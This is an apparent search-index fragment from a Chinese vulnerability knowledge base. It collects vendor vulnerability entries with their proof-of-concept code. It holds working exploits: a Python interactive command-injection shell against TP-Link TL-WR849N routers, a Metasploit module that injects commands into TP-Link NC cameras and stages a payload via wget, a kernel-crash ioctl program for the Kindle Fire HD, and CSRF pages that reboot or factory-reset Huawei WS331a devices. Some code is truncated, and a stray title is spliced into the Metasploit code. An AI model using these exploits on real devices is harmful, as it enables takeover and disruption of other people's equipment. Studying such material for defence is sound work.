\u670d\u52a1\u5668\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-1350","title":"\u624b\u52a8\u5347\u7ea7\u65b9\u6848\uff1a"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","text":"CVE-2020-1350-master","title":"POC"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_6","text":"https://www.cnvd.org.cn/flaw/show/CNVD-2020-51784","title":"\u6765\u6e90"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/TP-link/CVE-2020-9374/","text":"# Exploit Title: TP LINK TL-WR849N - Remote Code Execution # Date: 2019-11-20 # Exploit Author: Elber Tavares # Vendor Homepage: https://www.tp-link.com/ # Software Link: https://www.tp-link.com/br/support/download/tl-wr849n/#Firmware # Version: TL-WR849N 0.9.1 4.16 # Tested on: linux, windows # CVE : CVE-2020-9374 import requests def output ( headers , cookies ): url = 'http://192.168.0.1/cgi?1' data = '' data += '[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,3 \\x0d\\x0a ' data += 'diagnosticsState \\x0d\\x0a ' data += 'X_TP_HopSeq \\x0d\\x0a ' data += 'X_TP_Result \\x0d\\x0a ' r = requests . post ( url , data = data , headers = headers , cookies = cookies ) saida = r . text filtro = saida . replace ( ': Name or service not known' , '' ) filtro = filtro . replace ( '[0,0,0,0,0,0]0' , '' ) filtro = filtro . replace ( 'diagnosticsState=' , '' ) filtro = filtro . replace ( 'X_TP_HopSeq=0' , '' ) filtro = filtro . replace ( 'X_TP_Result=' , '' ) print ( filtro [: - 8 ]) def aceppt ( headers , cookies ): url = 'http://192.168.0.1/cgi?7' data = '[ACT_OP_TRACERT#0,0,0,0,0,0#0,0,0,0,0,0]0,0 \\x0d\\x0a ' r = requests . post ( url , data = data , headers = headers , cookies = cookies ) output ( headers , cookies ) def inject ( command , headers , cookies ): url = 'http://192.168.0.1/cgi?2' data = '' data += '[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,8 \\x0d\\x0a ' data += 'maxHopCount=20 \\x0d\\x0a ' data += 'timeout=5 \\x0d\\x0a ' data += 'numberOfTries=1 \\x0d\\x0a ' data += 'host= \\\" $(' + command + ') \\\"\\x0d\\x0a ' data += 'dataBlockSize=64 \\x0d\\x0a ' data += 'X_TP_ConnName=ewan_pppoe \\x0d\\x0a ' data += 'diagnosticsState=Requested \\x0d\\x0a ' data += 'X_TP_HopSeq=0 \\x0d\\x0a ' r = requests . post ( url , data = data , headers = headers , cookies = cookies ) aceppt ( headers , cookies ) def main (): cookies = { \"Authorization\" : \"Basic REPLACEBASE64AUTH\" } headers = { 'Content-Type' : 'text/plain' , 'Referer' : 'http://192.168.0.1/mainFrame.htm' } while True : command = input ( '$ ' ) inject ( command , headers , cookies ) main ()","title":"CVE 2020 9374"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/TP-link/TP-Link%E4%BA%91%E6%91%84%E5%83%8F%E5%A4%B4NCXXX%E7%B3%BB%E5%88%97%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E/","text":"1 ## 2 # This module requires Metasploit: https://metasploit.com/download 3 # Current source: https://github.com/rapid7/metasploit-framework 4 ## 5 6 class MetasploitModule < Msf::Exploit::Remote 7 Rank = ExcellentRanking 8 9 include Msf::Exploit::Remote::HttpClient 10 include Msf::Exploit::CmdStager 11 12 def initialize(info = {}) 13 super( 14 update_info( 15 info, 16 'Name' => 'TP-Link Cloud Cameras NCXXX Bonjour Command Injection', 17 'Description' => %q{ 18 TP-Link cloud cameras NCXXX series (NC200, NC210, NC220, NC230, 19 NC250, NC260, NC450) are vulnerable to an authenticated command 20 injection. In all devices except NC210, despite a check on the name length in 21 swSystemSetProductAliasCheck, no other checks are in place in order 22 to prevent shell metacharacters from being introduced. The system name 23 would then be used in swBonjourStartHTTP as part of a shell command 24 where arbitrary commands could be injected and executed as root. NC210 devices 25 cannot be exploited directly via /setsysname.cgi due to proper input 26 validation. NC210 devices are still vulnerable since swBonjourStartHTTP 27 did not perform any validation when reading the alias name from the 28 configuration file. The configuration file can be written, and code 29 execution can be achieved by combining this issue with CVE-2020-12110. 30 }, 31 'Author' => ['Pietro Oliva <pietroliva[at]gmail.com>'], 32 'License' => MSF_LICENSE, 33 'References' => 34 [ 35 [ 'URL', 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12109' ], 36 [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2020-12109' ], 37 [ 'URL', 'https://seclists.org/fulldisclosure/2020/May/2' ], 38 [ 'CVE', '2020-12109'] 39 ], 40 'DisclosureDate' => '2020-04-29', 41 'Platform' => 'linux', 42 'Arch' => ARCH_MIPSLE, 43 'Targets' => 44 [ 45 [ 46 'TP-Link NC200, NC220, NC230, NC250', 47 { 48 'Arch' => ARCH_MIPSLE, 49 'Platform' => 'linux', 50 'CmdStagerFlavor' => [ 'wget' ] 51 } 52 ], 53 [ 54 'TP-Link NC260, NC450', 55 { 56 'Arch' => ARCH_MIPSLE, 57 'Platform' => 'linux', 58 'CmdStagerFlavor' => [ 'wget' ], 59 'DefaultOptions' => { 'SSL' => true } 60 } 61 ] 62 ], 63 'DefaultTarget' => 0 64 ) 65 ) 66 67 register_options( 68 [ 69 OptString.new('USERNAME', [ true, 'The web interface username', 'admin' ]), 70 OptString.new('PASSWORD', [ true, 'The web interface password for the specified userna 71 ] 72 ) 73 end 74 75 def login 76 user = datastore['USERNAME'] 77 pass = Base64.strict_encode64(datastore['PASSWORD']) 78 if target.name == 'TP-Link NC260, NC450' 79 pass = Rex::Text.md5(pass) 80 end 81 82 print_status(\"Authenticating with #{user}:#{pass} ...\") 83 begin 84 res = send_request_cgi({ 85 'uri' => '/login.fcgi', 86 'method' => 'POST', 87 'vars_post' => { 88 'Username' => user, 89 'Password' => pass 90 } 91 }) 92 if res.nil? || res.code == 404 93 fail_with(Failure::NoAccess, '/login.fcgi did not reply correctly. Wrong target ip?') 94 end 95 if res.body =~ /\\\"errorCode\\\"\\:0/ && res.headers.key?('Set-Cookie') && res.body =~ /toke 96 print_good(\"Logged-in as #{user}\") 97 @cookie = res.get_cookies.scan(/\\s?([^, ;]+?)=([^, ;]*?)[;,]/)[0][1] 98 print_good(\"Got cookie: #{@cookie}\") 99 @token = res.body.scan(/\"(token)\":\"([^,\"]*)\"/)[0][1] 100 print_good(\"Got token: #{@token}\") 101 else 102 fail_with(Failure::NoAccess, \"Login failed with #{user}:#{pass}\") 103 end 104 rescue ::Rex::ConnectionError 105 fail_with(Failure::Unreachable, 'Connection failed') 106 end 107 end 108 109 def enable_bonjour 110 res = send_request_cgi({ 111 'uri' => '/setbonjoursetting.fcgi', 112 'method' => 'POST', 113 'encode_params' => false, 114 'cookie' => \"sess=#{@cookie}\", 115 'vars_post' => { 116 'bonjourState' => '1', 33.SpamTitan 7.07\u591a\u4e2aRCE\u6f0f\u6d1e 117 'token' => @token.to_s 118 } 119 }) 120 return res 121 rescue ::Rex::ConnectionError 122 vprint_error(\"Failed connection to the web server at #{rhost}:#{rport}\") 123 return nil 124 end 125 126 def sys_name(cmd) 127 res = send_request_cgi({ 128 'uri' => '/setsysname.fcgi', 129 'method' => 'POST', 130 'encode_params' => true, 131 'cookie' => \"sess=#{@cookie}\", 132 'vars_post' => { 133 'sysname' => cmd, 134 'token' => @token.to_s 135 } 136 }) 137 return res 138 rescue ::Rex::ConnectionError 139 vprint_error(\"Failed connection to the web server at #{rhost}:#{rport}\") 140 return nil 141 end 142 143 def execute_command(cmd, _opts = {}) 144 print_status(\"Executing command: #{cmd}\") 145 sys_name(\"$(#{cmd})\") 146 end 147 148 def exploit 149 login # Get cookie and csrf token 150 enable_bonjour # Enable bonjour service 151 execute_cmdstager # Upload and execute payload 152 sys_name('NC200') # Set back an innocent-looking device name 153 end 154 155 end","title":" "},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E4%BA%9A%E9%A9%AC%E9%80%8A/Amazon%20Kindle%20Fire%20HD%20%283rd%20Generation%29%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Amazon Kindle Fire HD (3 rd Generation)\u5185\u6838\u9a71\u52a8\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e 2018-10-10 \u5927\u5175 http://www.amazon.com/ \u4e0b\u8f7d\u8fde\u63a5 Fire OS 4.5.5.3 CVE-2018-11021 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 Amazon Kindle Fire HD(3 rd ) Fire OS 4.5.5.3\u7684\u5185\u6838\u6a21\u5757/omap/drivers/video/omap2/dsscomp/device.c\u4ee3\u7801\u4e2d\u5b58\u5728\u6f0f\u6d1e\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u901a\u8fc7ioctl\u5411\u9a71\u52a8\u6a21\u5757/dev/dsscomp\u53d1\u751f\u547d\u4ee4\u4e3a1118064517\u4e14\u7cbe\u5fc3\u6784\u9020\u7684payload\u53c2\u6570\uff0c\u5bfc\u81f4\u5185\u6838\u5d29\u6e83\u3002 POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a \u00b6 exp\u4ee3\u7801\u5982\u4e0b\uff1a /* * This is poc of Kindle Fire HD 3rd * A bug in the ioctl interface of device file /dev/dsscomp causes the system crash via IOCTL 1118064517. * Related buggy struct name is dsscomp_setup_dispc_data. * This Poc should run with permission to do ioctl on /dev/dsscomp. * * The fowllwing is kmsg of kernel crash infomation: * * */ #include <stdio.h> #include <fcntl.h> #include <errno.h> #include <sys/ioctl.h> const static char * driver = \"/dev/dsscomp\" ; static command = 1118064517 ; int main ( int argc , char ** argv , char ** env ) { unsigned int payload [] = { 0xffffffff , 0x00000003 , 0x5d200040 , 0x79900008 , 0x8f5928bd , 0x78b02422 , 0x00000000 , 0xffffffff , 0xf4c50400 , 0x007fffff , 0x8499f562 , 0xffff0400 , 0x001b131d , 0x60818210 , 0x00000007 , 0xffffffff , 0x00000000 , 0x9da9041c , 0xcd980400 , 0x001f03f4 , 0x00000007 , 0x2a34003f , 0x7c80d8f3 , 0x63102627 , 0xc73643a8 , 0xa28f0665 , 0x00000000 , 0x689e57b4 , 0x01ff0008 , 0x5e7324b1 , 0xae3b003f , 0x0b174d86 , 0x00000400 , 0x21ffff37 , 0xceb367a4 , 0x00000040 , 0x00000001 , 0xec000f9e , 0x00000001 , 0x000001ff , 0x00000000 , 0x00000000 , 0x0000000f , 0x0425c069 , 0x038cc3be , 0x0000000f , 0x00000080 , 0xe5790100 , 0x5b1bffff , 0x0000d355 , 0x0000c685 , 0xa0070000 , 0x0010ffff , 0x00a0ff00 , 0x00000001 , 0xff490700 , 0x0832ad03 , 0x00000006 , 0x00000002 , 0x00000001 , 0x81f871c0 , 0x738019cb , 0xbf47ffff , 0x00000040 , 0x00000001 , 0x7f190f33 , 0x00000001 , 0x8295769b , 0x0000003f , 0x869f2295 , 0xffffffff , 0xd673914f , 0x05055800 , 0xed69b7d5 , 0x00000000 , 0x0107ebbd , 0xd214af8d , 0xffff4a93 , 0x26450008 , 0x58df0000 , 0xd16db084 , 0x03ff30dd , 0x00000001 , 0x209aff3b , 0xe7850800 , 0x00000002 , 0x30da815c , 0x426f5105 , 0x0de109d7 , 0x2c1a65fc , 0xfcb3d75f , 0x00000000 , 0x00000001 , 0x8066be5b , 0x00000002 , 0xffffffff , 0x5cf232ec , 0x680d1469 , 0x00000001 , 0x00000020 , 0xffffffff , 0x00000400 , 0xd1d12be8 , 0x02010200 , 0x01ffc16f , 0xf6e237e6 , 0x007f0000 , 0x01ff08f8 , 0x000f00f9 , 0xbad07695 , 0x00000000 , 0xbaff0000 , 0x24040040 , 0x00000006 , 0x00000004 , 0x00000000 , 0xbc2e9242 , 0x009f5f08 , 0x00800000 , 0x00000000 , 0x00000001 , 0xff8800ff , 0x00000001 , 0x00000000 , 0x000003f4 , 0x6faa8472 , 0x00000400 , 0xec857dd5 , 0x00000000 , 0x00000040 , 0xffffffff , 0x3f004874 , 0x0000b77a , 0xec9acb95 , 0xfacc0001 , 0xffff0001 , 0x0080ffff , 0x3600ff03 , 0x00000001 , 0x8fff7d7f , 0x6b87075a , 0x00000000 , 0x41414141 , 0x41414141 , 0x41414141 , 0x41414141 , 0x001001ff , 0x00000000 , 0x00000001 , 0xff1f0512 , 0x00000001 , 0x51e32167 , 0xc18c55cc , 0x00000000 , 0xffffffff , 0xb4aaf12b , 0x86edfdbd , 0x00000010 , 0x0000003f , 0xabff7b00 , 0xffff9ea3 , 0xb28e0040 , 0x000fffff , 0x458603f4 , 0xffff007f , 0xa9030f02 , 0x00000001 , 0x002cffff , 0x9e00cdff , 0x00000004 , 0x41414141 , 0x41414141 , 0x41414141 , 0x41414141 }; int fd = 0 ; fd = open ( driver , O_RDWR ); if ( fd < 0 ) { printf ( \"Failed to open %s, with errno %d \\n \" , driver , errno ); system ( \"echo 1 > /data/local/tmp/log\" ); return -1 ; } printf ( \"Try open %s with command 0x%x. \\n \" , driver , command ); printf ( \"System will crash and reboot. \\n \" ); if ( ioctl ( fd , command , & payload ) < 0 ) { printf ( \"Allocation of structs failed, %d \\n \" , errno ); system ( \"echo 2 > /data/local/tmp/log\" ); return -1 ; } close ( fd ); return 0 ; }","title":"Amazon Kindle Fire HD (3rd Generation)\u5185\u6838\u9a71\u52a8\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E4%BA%9A%E9%A9%AC%E9%80%8A/Amazon%20Kindle%20Fire%20HD%20%283rd%20Generation%29%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/#_1","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Amazon Kindle Fire HD (3 rd Generation)\u5185\u6838\u9a71\u52a8\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e 2018-10-10 \u5927\u5175 http://www.amazon.com/ \u4e0b\u8f7d\u8fde\u63a5 Fire OS 4.5.5.3 CVE-2018-11021","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E4%BA%9A%E9%A9%AC%E9%80%8A/Amazon%20Kindle%20Fire%20HD%20%283rd%20Generation%29%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/#_2","text":"Amazon Kindle Fire HD(3 rd ) Fire OS 4.5.5.3\u7684\u5185\u6838\u6a21\u5757/omap/drivers/video/omap2/dsscomp/device.c\u4ee3\u7801\u4e2d\u5b58\u5728\u6f0f\u6d1e\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u901a\u8fc7ioctl\u5411\u9a71\u52a8\u6a21\u5757/dev/dsscomp\u53d1\u751f\u547d\u4ee4\u4e3a1118064517\u4e14\u7cbe\u5fc3\u6784\u9020\u7684payload\u53c2\u6570\uff0c\u5bfc\u81f4\u5185\u6838\u5d29\u6e83\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E4%BA%9A%E9%A9%AC%E9%80%8A/Amazon%20Kindle%20Fire%20HD%20%283rd%20Generation%29%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/#poc","text":"exp\u4ee3\u7801\u5982\u4e0b\uff1a /* * This is poc of Kindle Fire HD 3rd * A bug in the ioctl interface of device file /dev/dsscomp causes the system crash via IOCTL 1118064517. * Related buggy struct name is dsscomp_setup_dispc_data. * This Poc should run with permission to do ioctl on /dev/dsscomp. * * The fowllwing is kmsg of kernel crash infomation: * * */ #include <stdio.h> #include <fcntl.h> #include <errno.h> #include <sys/ioctl.h> const static char * driver = \"/dev/dsscomp\" ; static command = 1118064517 ; int main ( int argc , char ** argv , char ** env ) { unsigned int payload [] = { 0xffffffff , 0x00000003 , 0x5d200040 , 0x79900008 , 0x8f5928bd , 0x78b02422 , 0x00000000 , 0xffffffff , 0xf4c50400 , 0x007fffff , 0x8499f562 , 0xffff0400 , 0x001b131d , 0x60818210 , 0x00000007 , 0xffffffff , 0x00000000 , 0x9da9041c , 0xcd980400 , 0x001f03f4 , 0x00000007 , 0x2a34003f , 0x7c80d8f3 , 0x63102627 , 0xc73643a8 , 0xa28f0665 , 0x00000000 , 0x689e57b4 , 0x01ff0008 , 0x5e7324b1 , 0xae3b003f , 0x0b174d86 , 0x00000400 , 0x21ffff37 , 0xceb367a4 , 0x00000040 , 0x00000001 , 0xec000f9e , 0x00000001 , 0x000001ff , 0x00000000 , 0x00000000 , 0x0000000f , 0x0425c069 , 0x038cc3be , 0x0000000f , 0x00000080 , 0xe5790100 , 0x5b1bffff , 0x0000d355 , 0x0000c685 , 0xa0070000 , 0x0010ffff , 0x00a0ff00 , 0x00000001 , 0xff490700 , 0x0832ad03 , 0x00000006 , 0x00000002 , 0x00000001 , 0x81f871c0 , 0x738019cb , 0xbf47ffff , 0x00000040 , 0x00000001 , 0x7f190f33 , 0x00000001 , 0x8295769b , 0x0000003f , 0x869f2295 , 0xffffffff , 0xd673914f , 0x05055800 , 0xed69b7d5 , 0x00000000 , 0x0107ebbd , 0xd214af8d , 0xffff4a93 , 0x26450008 , 0x58df0000 , 0xd16db084 , 0x03ff30dd , 0x00000001 , 0x209aff3b , 0xe7850800 , 0x00000002 , 0x30da815c , 0x426f5105 , 0x0de109d7 , 0x2c1a65fc , 0xfcb3d75f , 0x00000000 , 0x00000001 , 0x8066be5b , 0x00000002 , 0xffffffff , 0x5cf232ec , 0x680d1469 , 0x00000001 , 0x00000020 , 0xffffffff , 0x00000400 , 0xd1d12be8 , 0x02010200 , 0x01ffc16f , 0xf6e237e6 , 0x007f0000 , 0x01ff08f8 , 0x000f00f9 , 0xbad07695 , 0x00000000 , 0xbaff0000 , 0x24040040 , 0x00000006 , 0x00000004 , 0x00000000 , 0xbc2e9242 , 0x009f5f08 , 0x00800000 , 0x00000000 , 0x00000001 , 0xff8800ff , 0x00000001 , 0x00000000 , 0x000003f4 , 0x6faa8472 , 0x00000400 , 0xec857dd5 , 0x00000000 , 0x00000040 , 0xffffffff , 0x3f004874 , 0x0000b77a , 0xec9acb95 , 0xfacc0001 , 0xffff0001 , 0x0080ffff , 0x3600ff03 , 0x00000001 , 0x8fff7d7f , 0x6b87075a , 0x00000000 , 0x41414141 , 0x41414141 , 0x41414141 , 0x41414141 , 0x001001ff , 0x00000000 , 0x00000001 , 0xff1f0512 , 0x00000001 , 0x51e32167 , 0xc18c55cc , 0x00000000 , 0xffffffff , 0xb4aaf12b , 0x86edfdbd , 0x00000010 , 0x0000003f , 0xabff7b00 , 0xffff9ea3 , 0xb28e0040 , 0x000fffff , 0x458603f4 , 0xffff007f , 0xa9030f02 , 0x00000001 , 0x002cffff , 0x9e00cdff , 0x00000004 , 0x41414141 , 0x41414141 , 0x41414141 , 0x41414141 }; int fd = 0 ; fd = open ( driver , O_RDWR ); if ( fd < 0 ) { printf ( \"Failed to open %s, with errno %d \\n \" , driver , errno ); system ( \"echo 1 > /data/local/tmp/log\" ); return -1 ; } printf ( \"Try open %s with command 0x%x. \\n \" , driver , command ); printf ( \"System will crash and reboot. \\n \" ); if ( ioctl ( fd , command , & payload ) < 0 ) { printf ( \"Allocation of structs failed, %d \\n \" , errno ); system ( \"echo 2 > /data/local/tmp/log\" ); return -1 ; } close ( fd ); return 0 ; }","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E4%B8%BA/%E5%8D%8E%E4%B8%BAWS331a%E4%BA%A7%E5%93%81%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 \u534e\u4e3aWS331a\u4ea7\u54c1\u7ba1\u7406\u9875\u9762\u5b58\u5728CSRF\u6f0f\u6d1e 2016-09-07 zixian\uff08 me@zixian.org \uff09 http://www.huawei.com/ http://www.huawei.com/ WS331a-10 V100R001C02B017SP01\u53ca\u4e4b\u524d\u7248\u672c CVE-2016-6158 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 \u534e\u4e3aWS331a \u662f\u4e00\u6b3e\u4fbf\u643a\u65e0\u7ebf\u8def\u7531\u5668\u3002 WS331a\u4ea7\u54c1\u7684\u7ba1\u7406\u9875\u9762\u4e2d\u5b58\u5728\u4e00\u4e2aCSRF\u6f0f\u6d1e\uff0c\u672a\u7ecf\u8fc7\u8ba4\u8bc1\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u6b64\u6f0f\u6d1e\u53d1\u8d77CSRF\u653b\u51fb\u3002\u6210\u529f\u5229\u7528\u6b64\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5411\u53d7\u5f71\u54cd\u8bbe\u5907\u63d0\u4ea4\u7279\u5b9a\u8bf7\u6c42\u8fdb\u800c\u5bfc\u81f4\u8bbe\u5907\u6062\u590d\u51fa\u5382\u8bbe\u7f6e\u6216\u8005\u91cd\u542f\u3002 (\u6f0f\u6d1e\u7f16\u53f7:HWPSIRT-2016-07078) \u6b64\u6f0f\u6d1e\u7684CVE\u7f16\u53f7\u4e3a\uff1aCVE-2016-6158\u3002 POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a \u00b6 \u5f53\u7ba1\u7406\u5458\u767b\u9646\u540e\uff0c\u6253\u5f00\u5982\u4e0bpoc\u9875\u9762\uff0cWS331a\u8bbe\u5907\u5c06\u91cd\u542f\u3002 < form action = \"http://192.168.3.1/api/service/reboot.cgi\" method = \"post\" > </ form > < script > document . forms [ 0 ]. submit (); </ script > \u5f53\u7ba1\u7406\u5458\u767b\u9646\u540e\uff0c\u6253\u5f00\u5982\u4e0bpoc\u9875\u9762\uff0cWS331a\u8bbe\u5907\u5c06\u6062\u590d\u521d\u59cb\u5316\u914d\u7f6e\u3002\u8bbe\u5907\u81ea\u52a8\u91cd\u542f\u540e\u4e0d\u9700\u8981\u5bc6\u7801\u5373\u53ef\u8fde\u63a5\u70ed\u70b9\uff0c\u5e76\u4f7f\u7528amdin/admin\u5bf9\u8bbe\u5907\u8fdb\u884c\u7ba1\u7406\u63a7\u5236\u3002 < form action = \"http://192.168.3.1/api/service/restoredefcfg.cgi\" method = \"post\" > </ form > < script > document . forms [ 0 ]. submit (); </ script >","title":"\u534e\u4e3aWS331a\u4ea7\u54c1\u7ba1\u7406\u9875\u9762\u5b58\u5728CSRF\u6f0f\u6d1e"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E4%B8%BA/%E5%8D%8E%E4%B8%BAWS331a%E4%BA%A7%E5%93%81%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E/#_1","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 \u534e\u4e3aWS331a\u4ea7\u54c1\u7ba1\u7406\u9875\u9762\u5b58\u5728CSRF\u6f0f\u6d1e 2016-09-07 zixian\uff08 me@zixian.org \uff09 http://www.huawei.com/ http://www.huawei.com/ WS331a-10 V100R001C02B017SP01\u53ca\u4e4b\u524d\u7248\u672c CVE-2016-6158","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E4%B8%BA/%E5%8D%8E%E4%B8%BAWS331a%E4%BA%A7%E5%93%81%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E/#_2","text":"\u534e\u4e3aWS331a \u662f\u4e00\u6b3e\u4fbf\u643a\u65e0\u7ebf\u8def\u7531\u5668\u3002 WS331a\u4ea7\u54c1\u7684\u7ba1\u7406\u9875\u9762\u4e2d\u5b58\u5728\u4e00\u4e2aCSRF\u6f0f\u6d1e\uff0c\u672a\u7ecf\u8fc7\u8ba4\u8bc1\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u6b64\u6f0f\u6d1e\u53d1\u8d77CSRF\u653b\u51fb\u3002\u6210\u529f\u5229\u7528\u6b64\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5411\u53d7\u5f71\u54cd\u8bbe\u5907\u63d0\u4ea4\u7279\u5b9a\u8bf7\u6c42\u8fdb\u800c\u5bfc\u81f4\u8bbe\u5907\u6062\u590d\u51fa\u5382\u8bbe\u7f6e\u6216\u8005\u91cd\u542f\u3002 (\u6f0f\u6d1e\u7f16\u53f7:HWPSIRT-2016-07078) \u6b64\u6f0f\u6d1e\u7684CVE\u7f16\u53f7\u4e3a\uff1aCVE-2016-6158\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E4%B8%BA/%E5%8D%8E%E4%B8%BAWS331a%E4%BA%A7%E5%93%81%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E/#poc","text":"\u5f53\u7ba1\u7406\u5458\u767b\u9646\u540e\uff0c\u6253\u5f00\u5982\u4e0bpoc\u9875\u9762\uff0cWS331a\u8bbe\u5907\u5c06\u91cd\u542f\u3002 < form action = \"http://192.168.3.1/api/service/reboot.cgi\" method = \"post\" > </ form > < script > document . forms [ 0 ]. submit (); </ script > \u5f53\u7ba1\u7406\u5458\u767b\u9646\u540e\uff0c\u6253\u5f00\u5982\u4e0bpoc\u9875\u9762\uff0cWS331a\u8bbe\u5907\u5c06\u6062\u590d\u521d\u59cb\u5316\u914d\u7f6e\u3002\u8bbe\u5907\u81ea\u52a8\u91cd\u542f\u540e\u4e0d\u9700\u8981\u5bc6\u7801\u5373\u53ef\u8fde\u63a5\u70ed\u70b9\uff0c\u5e76\u4f7f\u7528amdin/admin\u5bf9\u8bbe\u5907\u8fdb\u884c\u7ba1\u7406\u63a7\u5236\u3002 < form action = \"http://192.168.3.1/api/service/restoredefcfg.cgi\" method = \"post\" > </ form > < script > document . forms [ 0 ]. submit (); </ script >","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8F%8B%E8%AE%AF/CVE-2019-16920-D-Link-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","text":"D-Link\u8def\u7531\u5668\u66dd\u51faRCE\u6f0f\u6d1e\uff0c\u7275\u6d89\u591a\u4e2a\u578b\u53f7 \u00b6 \u7b80\u4ecb \u00b6 Fortinet\u65d7\u4e0bFortiGuard\u5b9e\u9a8c\u5ba4\u7684\u7814\u7a76\u4eba\u5458\u62ab\u9732\u4e86D-Link\u8def\u7531\u5668\u4e0a\u7684\u4e00\u4e2a\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u7275\u6d89\u591a\u4e2a\u578b\u53f7 \u76f8\u5173\u6587\u7ae0 \u00b6 https://www.fortinet.com/blog/threat-research/d-link-routers-found-vulnerable-rce.html https://nosec.org/home/detail/3020.html 